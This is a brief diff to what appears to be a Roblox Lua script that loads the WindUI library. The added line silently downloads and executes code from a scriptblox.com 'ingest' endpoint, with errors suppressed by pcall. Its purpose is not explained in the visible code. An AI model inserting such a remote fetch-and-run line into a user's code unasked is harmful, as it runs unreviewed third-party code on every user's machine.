@@ -16,6 +16,7 @@ for _, name in ipairs({"WindUI", "WindUI/Notifications", "WindUI/Dropdowns", "Wi
 end
 
 local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_879959c742fe", "1.0.0", false) end)
 
 local ScooterPhysics = nil
 pcall(function()
